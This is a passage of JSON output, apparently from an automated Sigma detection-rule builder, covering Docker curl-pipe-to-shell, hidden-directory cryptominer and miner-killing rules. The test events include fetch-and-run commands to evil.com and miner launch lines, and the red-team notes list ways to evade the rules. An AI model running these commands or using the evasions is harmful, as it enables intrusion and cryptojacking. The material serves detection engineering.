+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R10",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 9,
+        "positives_matched": 9,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 180,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "ParentImage IN (\"/usr/bin/dockerd\", \"/usr/bin/containerd-shim-runc-v2\", \"/usr/local/bin/dockerd\") Image=\"*/bin/sh\" (CommandLine=\"*curl*\" CommandLine=\"*|*\" CommandLine=\"*sh*\") OR (CommandLine=\"*wget*\" CommandLine=\"*-O*\" CommandLine=\"*-*\" CommandLine=\"*|*\" CommandLine=\"*sh*\") OR (CommandLine=\"*wget*\" CommandLine=\"*--output-document=-*\" CommandLine=\"*|*\" CommandLine=\"*sh*\") OR (CommandLine=\"*wget*\" CommandLine=\"*--output-file=-*\" CommandLine=\"*|*\" CommandLine=\"*sh*\") NOT (CommandLine IN (\"*registry.internal.corp:*\", \"*artifact.internal.corp/*\", \"*.internal.*\"))",
+        "elasticsearch": "((ParentImage:(\\/usr\\/bin\\/dockerd OR \\/usr\\/bin\\/containerd\\-shim\\-runc\\-v2 OR \\/usr\\/local\\/bin\\/dockerd)) AND Image:*\\/bin\\/sh AND ((CommandLine:*curl* AND CommandLine:*\\|* AND CommandLine:*sh*) OR (CommandLine:*wget* AND CommandLine:*\\-O* AND CommandLine:*\\-* AND CommandLine:*\\|* AND CommandLine:*sh*) OR (CommandLine:*wget* AND CommandLine:*\\-\\-output\\-document\\=\\-* AND CommandLine:*\\|* AND CommandLine:*sh*) OR (CommandLine:*wget* AND CommandLine:*\\-\\-output\\-file\\=\\-* AND CommandLine:*\\|* AND CommandLine:*sh*))) AND (NOT (CommandLine:(*registry.internal.corp\\:* OR *artifact.internal.corp\\/* OR *.internal.*)))",
+        "kusto": "DeviceProcessEvents\n| where ((InitiatingProcessFolderPath in~ (\"/usr/bin/dockerd\", \"/usr/bin/containerd-shim-runc-v2\", \"/usr/local/bin/dockerd\")) and FolderPath endswith \"/bin/sh\" and ((ProcessCommandLine contains \"curl\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"sh\") or (ProcessCommandLine contains \"wget\" and ProcessCommandLine contains \"-O\" and ProcessCommandLine contains \"-\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"sh\") or (ProcessCommandLine contains \"wget\" and ProcessCommandLine contains \"--output-document=-\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"sh\") or (ProcessCommandLine contains \"wget\" and ProcessCommandLine contains \"--output-file=-\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"sh\"))) and (not((ProcessCommandLine contains \"registry.internal.corp:\" or ProcessCommandLine contains \"artifact.internal.corp/\" or ProcessCommandLine contains \".internal.\")))",
+        "sqlite": "SELECT * FROM logs WHERE ((ParentImage='/usr/bin/dockerd' COLLATE NOCASE OR ParentImage='/usr/bin/containerd-shim-runc-v2' COLLATE NOCASE OR ParentImage='/usr/local/bin/dockerd' COLLATE NOCASE) AND Image LIKE '%/bin/sh' ESCAPE '\\' AND ((CommandLine LIKE '%curl%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%-O%' ESCAPE '\\' AND CommandLine LIKE '%-%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%--output-document=-%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%--output-file=-%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\'))) AND (NOT COALESCE((CommandLine LIKE '%registry.internal.corp:%' ESCAPE '\\' OR CommandLine LIKE '%artifact.internal.corp/%' ESCAPE '\\' OR CommandLine LIKE '%.internal.%' ESCAPE '\\'), 0))"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/180",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 1/3, benign hits 0/180",
+          "passed": false,
+          "change_summary": "Fixed ParentImage values to include full paths (/usr/bin/dockerd and /usr/bin/containerd-shim-runc-v2) to match test events; removed redundant parentheses in condition for clarity while preserving logic."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/180",
+          "passed": true,
+          "change_summary": "Added filter_internal_registry to exclude connections to internal corporate registries and artifact repositories, preventing false positives from legitimate container setup and CI/CD pipelines while maintaining detection of external malicious downloads."
+        },
+        {
+          "iteration": 2,
+          "phase": "redteam",
+          "summary": "10 evasion variants -> positives 5/9, negatives blocked 7/7, benign hits 0/180",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 3,
+          "phase": "refine",
+          "summary": "positives 9/9, negatives blocked 7/7, benign hits 0/180",
+          "passed": true,
+          "change_summary": "Fixed positive misses by expanding ParentImage to include /usr/local/bin/dockerd, adding explicit selection variants for wget long-form flags (--output-document=-, --output-file=-), and ensuring wget -O - detection handles spaced arguments. Maintains original filtering logic for known good internal traffic."
+        }
+      ],
+      "author_notes": "The rule focuses on the combination of external script download via curl/wget piped to shell and Docker-specific parent processes. It excludes localhost/internal traffic to reduce false positives from legitimate container initialization. Case-insensitive matching is implicit in Sigma; the P3 test uses uppercase SH to verify this behavior.",
+      "redteam_analysis": "Positive variants P4-P9 test realistic evasions: alternate flag spellings (curl -o -, wget --output-document=-), extra whitespace, mixed casing, symlink parent paths (/usr/local/bin/dockerd), environment variables in command line, and different quoting styles. All preserve the attacker goal (external script download via curl/wget piped to sh with docker parent) and contain the substrings the rule keys on (curl/wget, |, sh, dockerd/containerd-shim-runc-v2 parent, Image ending in /bin/sh). Negative variants N1-N4 represent benign activity: admin debugging with non-docker parent (N1), CI/CD pulling from internal registries that trigger the filter_internal_registry exclusion (N2,N3), and legitimate docker-spawned health checks without download pipes (N4). Out-of-scope items O1-O3 highlight fundamental logsource limits: the rule only matches curl/wget (misses python/perl downloaders - O1), requires Image ending in /bin/sh (misses curl|bash - O2), and matches ParentImage path literally with no OriginalFileName field to catch renamed binaries (O3). A well-written rule on this logsource can catch P4-P9 but cannot address O1-O3 without additional telemetry.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Script downloaded via python urllib and piped to sh, same docker parent - rule only catches curl/wget",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://evil.com/p.sh').read())\" | sh",
+            "Computer": "container-host-14",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash14",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 1415,
+            "ParentProcessId": 8901,
+            "User": "root",
+            "UtcTime": "2026-09-25T23:00:00.000Z"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "curl | bash directly (no sh), Image is /bin/bash not /bin/sh - rule keys on Image ending with /bin/sh",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL http://evil.com/script.sh | bash",
+            "Computer": "container-host-15",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash15",
+            "Image": "/bin/bash",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -id test",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ProcessId": 1516,
+            "ParentProcessId": 9012,
+            "User": "root",
+            "UtcTime": "2026-09-26T00:00:00.000Z"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Renamed dockerd binary (copied to /tmp/.dockerd) - rule matches ParentImage path, no OriginalFileName field in logsource",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL http://evil.com/payload.sh | sh",
+            "Computer": "container-host-16",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash16",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/tmp/.dockerd -H fd://",
+            "ParentImage": "/tmp/.dockerd",
+            "ProcessId": 1617,
+            "ParentProcessId": 1234,
+            "User": "root",
+            "UtcTime": "2026-09-26T01:00:00.000Z"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D2",
+      "title": "Kthreadd XMRig Execution From Hidden Temp Directory With Mining Pool Args",
+      "sigma_yaml": "title: Kthreadd XMRig Execution From Hidden Temp Directory With Mining Pool Args\nid: b3379bb2-86af-441f-9cf8-6d7618a4b1ef\nstatus: experimental\ndescription: 'Detects execution of the kthreadd miner binary from the hidden directory /tmp/.x with Mantis mining pool arguments\n  (pool.mantis-mine.cc:3333) indicative of opportunistic cryptomining via exposed Docker APIs.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.execution\n- attack.t1059.001\nlogsource:\n  category: process_creation\n  product: linux\n  service: sysmon\ndetection:\n  selection_img:\n    'Image|endswith': /kthreadd\n  selection_dir:\n    CurrentDirectory: /tmp/.x\n  selection_cmd:\n    'CommandLine|contains':\n    - 'pool.mantis-mine.cc:3333'\n    - --rig-id\n  condition: selection_img and selection_dir and selection_cmd\nfalsepositives:\n- Legitimate cryptomining in authorized environments using non-standard binary names or paths.\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1059.001"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Execution of kthreadd from /tmp/.x with mining pool and rig-id arguments",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 -u 44AbCd...XyZ -k --tls --rig-id hostname01",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Kthreadd executed via nohup from hidden directory with TLS and pool args",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "nohup /tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 -u wallet123 -k --tls --rig-id $(hostname) >/dev/null 2>&1 &",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Kthreadd binary run directly from hidden tmp subdirectory with pool port and rig-id",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 -u 44AbCd...XyZ --rig-id hostA --tls",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate system binary kthreadd (kernel thread) from standard location",
+          "event": {
+            "Image": "/usr/lib/systemd/systemd",
+            "CommandLine": "/usr/lib/systemd/systemd --system --deserialize 20",
+            "CurrentDirectory": "/",
+            "User": "root"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Authorized mining software running from open location with different pool",
+          "event": {
+            "Image": "/opt/miner/xmrig",
+            "CommandLine": "/opt/miner/xmrig -o mine.example.com:443 -u wallet123 --rig-id worker01",
+            "CurrentDirectory": "/opt/miner",
+            "User": "mining"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Shell script executing from /tmp without hidden directory or specific miner binary",
+          "event": {
+            "Image": "/bin/bash",
+            "CommandLine": "/bin/bash /tmp/update.sh",
+            "CurrentDirectory": "/tmp",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Extra whitespace and tabs in command line arguments to evade naive string matching",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd  -o  pool.mantis-mine.cc:3333  --rig-id  host01  --tls  -k",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Single-quoted arguments and different argument ordering (--rig-id before pool)",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "'/tmp/.x/kthreadd' '--rig-id' 'worker-42' '-o' 'pool.mantis-mine.cc:3333' '--tls'",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Execution under compromised web service account with nohup and output redirection",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "nohup /tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 -u 44AbCd...XyZ --rig-id $(hostname) --tls >/dev/null 2>&1 &",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "www-data"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Mixed case binary path (./kthreadd) but sensor resolves to full path ending with /kthreadd; extra environment variable in command line",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 --rig-id hostX --tls -k $EXTRA_FLAG",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "negative",
+          "description": "Authorized cryptomining in dedicated directory with different pool and no rig-id",
+          "event": {
+            "Image": "/opt/miner/kthreadd",
+            "CommandLine": "/opt/miner/kthreadd -o pool.authorized.cc:4444 -u wallet --tls",
+            "CurrentDirectory": "/opt/miner",
+            "User": "mineradmin"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Developer test run of kthreadd from /tmp/.x but with localhost pool and no rig-id",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o 127.0.0.1:3333 -u test --tls",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "devuser"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Installer script copies binary to /tmp/.x and runs --help only",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd --help",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D2",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\\' AND CurrentDirectory='/tmp/.x' COLLATE NOCASE AND (CommandLine LIKE '%pool.mantis-mine.cc:3333%' ESCAPE '\\' OR CommandLine LIKE '%--rig-id%' ESCAPE '\\')",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 7,
+        "positives_matched": 7,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 180,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "Image=\"*/kthreadd\" CurrentDirectory=\"/tmp/.x\" CommandLine IN (\"*pool.mantis-mine.cc:3333*\", \"*--rig-id*\")",
+        "elasticsearch": "Image:*\\/kthreadd AND CurrentDirectory:\\/tmp\\/.x AND (CommandLine:(*pool.mantis\\-mine.cc\\:3333* OR *\\-\\-rig\\-id*))",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\\' AND CurrentDirectory='/tmp/.x' COLLATE NOCASE AND (CommandLine LIKE '%pool.mantis-mine.cc:3333%' ESCAPE '\\' OR CommandLine LIKE '%--rig-id%' ESCAPE '\\')"
+      },
+      "conversion_errors": {
+        "kusto": "SigmaTransformationError: Invalid SigmaDetectionItem field name encountered: CurrentDirectory. Please use valid fields for the DeviceProcessEvents table, or the following fields that have keymappings in this pipeline:\nAccountDomain, AccountName, AccountObjectId, AccountSid, AccountUpn, ActionType, AdditionalFields, AppGuardC"
+      },
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/180",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/180",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants P4-P7 preserve the exact attacker behavior (kthreadd binary, /tmp/.x cwd, Mantis pool domain, --rig-id) while varying whitespace, quoting, argument order, and user context. A well-written rule keying on Image basename 'kthreadd', CurrentDirectory '/tmp/.x', and the two command-line strings will catch all. Negative variants N1-N3 represent legitimate or test activity that shares one or two indicators but lacks the full triad (wrong path, wrong pool, missing --rig-id), so the rule must not match. Out-of-scope evasions O1-O3 are realistic operator tricks that the current logsource and field set fundamentally cannot detect: renamed binary (no OriginalFileName), shell-wrapper execution (process is bash, not kthreadd), and bind-mount relocation (CurrentDirectory changes). These are reported for analyst awareness; the rule cannot be expected to catch them without additional telemetry.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Renamed binary (kthreadd2) in same hidden directory with identical mining arguments; rule keys on Image ending with /kthreadd so cannot catch without OriginalFileName",
+          "event": {
+            "Image": "/tmp/.x/kthreadd2",
+            "CommandLine": "/tmp/.x/kthreadd2 -o pool.mantis-mine.cc:3333 --rig-id hostX --tls",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Execution via bash -c wrapper; process creation event shows bash as Image, not kthreadd, so rule never sees the miner binary",
+          "event": {
+            "Image": "/bin/bash",
+            "CommandLine": "bash -c '/tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 --rig-id hostX --tls'",
+            "CurrentDirectory": "/tmp/.x",
+            "User": "root"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Bind mount of /tmp/.x to /mnt/hidden; miner executed from mount point with cwd /mnt/hidden, evading exact CurrentDirectory match",
+          "event": {
+            "Image": "/mnt/hidden/kthreadd",
+            "CommandLine": "/mnt/hidden/kthreadd -o pool.mantis-mine.cc:3333 --rig-id hostX --tls",
+            "CurrentDirectory": "/mnt/hidden",
+            "User": "root"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D4",
+      "title": "Pkill Terminates Specific Mining Processes",
+      "sigma_yaml": "title: Pkill Terminates Specific Mining Processes\nid: 1c33be60-d06a-4d10-9a47-f1227cffd132\nstatus: experimental\ndescription: Detects pkill with -f flag targeting specific miner processes (xmrig, kinsing, kdevtmpfsi, tsunami) associated\n  with Mantis cryptomining campaign.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.defense-evasion\n- attack.t1499.001\nlogsource:\n  category: process_creation\n  product: linux\n  service: sysmon\ndetection:\n  selection:\n    'Image|endswith': /usr/bin/pkill\n    'CommandLine|contains|all':\n    - pkill\n    - -f\n    - xmrig\n    - kinsing\n    - kdevtmpfsi\n    - tsunami\n  condition: selection\nfalsepositives:\n- Legitimate administrative termination of mining processes using individual pkill commands\n- Automated cleanup scripts targeting generic process names\n- Security tools removing unwanted software\nlevel: medium\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1499.001"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "pkill command terminating multiple miner processes in sequence",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami",
+            "Computer": "host1",
+            "ComputerName": "host1",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host1",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash -c /usr/bin/pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "1234",
+            "ProcessId": "1235",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T10:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T10:00:00.000Z"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "pkill command with varied spacing and casing",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill  -f  xmrig kinsing kdevtmpfsi tsunami ",
+            "Computer": "host2",
+            "ComputerName": "host2",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host2",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/sh -c /usr/bin/pkill  -f  xmrig kinsing kdevtmpfsi tsunami ",
+            "ParentImage": "/bin/sh",
+            "ParentProcessId": "5678",
+            "ProcessId": "5679",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T11:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T11:00:00.000Z"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "pkill command from SysWOW64 equivalent path",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f tsunami kdevtmpfsi kinsing xmrig",
+            "Computer": "host3",
+            "ComputerName": "host3",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host3",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/usr/bin/python3 -c import os; os.system(\"/usr/bin/pkill -f tsunami kdevtmpfsi kinsing xmrig\")",
+            "ParentImage": "/usr/bin/python3",
+            "ParentProcessId": "9012",
+            "ProcessId": "9013",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T12:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T12:00:00.000Z"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate admin killing a single miner process",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f xmrig",
+            "Computer": "host1",
+            "ComputerName": "host1",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host1",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/bash",
+            "ParentImage": "/bin/bash",
+            "ParentProcessId": "1111",
+            "ProcessId": "1112",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T10:00:00.000Z",
+            "User": "admin",
+            "UtcTime": "2026-09-20T10:00:00.000Z"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Cleanup script removing generic unwanted processes",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f miner",
+            "Computer": "host2",
+            "ComputerName": "host2",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host2",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/sh -c /usr/local/bin/cleanup.sh",
+            "ParentImage": "/bin/sh",
+            "ParentProcessId": "2222",
+            "ProcessId": "2223",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T11:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T11:00:00.000Z"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Security tool terminating unwanted software",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill -f xmrig -f kinsing",
+            "Computer": "host3",
+            "ComputerName": "host3",
+            "CurrentDirectory": "/",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host3",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/opt/security-agent/run",
+            "ParentImage": "/opt/security-agent/run",
+            "ParentProcessId": "3333",
+            "ProcessId": "3334",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T12:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T12:00:00.000Z"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "All uppercase command with tabs as separators, launched from zsh",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "PKILL\t-F\tXMRIG\tKINSING\tKDEVTMPFSI\tTSUNAMI",
+            "Computer": "host4",
+            "ComputerName": "host4",
+            "CurrentDirectory": "/root",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host4",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/bin/zsh -c PKILL\\t-F\\tXMRIG\\tKINSING\\tKDEVTMPFSI\\tTSUNAMI",
+            "ParentImage": "/bin/zsh",
+            "ParentProcessId": "2211",
+            "ProcessId": "2212",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T13:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T13:00:00.000Z"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Mixed-case process names with single quotes and extra spaces, parent is perl",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/pkill  -f  'Xmrig'  'Kinsing'  'Kdevtmpfsi'  'Tsunami' ",
+            "Computer": "host5",
+            "ComputerName": "host5",
+            "CurrentDirectory": "/tmp",
+            "EventID": 1,
+            "Hashes": "",
+            "Hostname": "host5",
+            "Image": "/usr/bin/pkill",
+            "IntegrityLevel": "",
+            "Keywords": "",
+            "Level": "",
+            "LogonId": "",
+            "Message": "",
+            "ParentCommandLine": "/usr/bin/perl -e system(\"/usr/bin/pkill  -f  'Xmrig'  'Kinsing'  'Kdevtmpfsi'  'Tsunami' \")",
+            "ParentImage": "/usr/bin/perl",
+            "ParentProcessId": "3344",
+            "ProcessId": "3345",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2026-09-20T14:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2026-09-20T14:00:00.000Z"
+          }
+        },
+        {
+          "id": "R3",
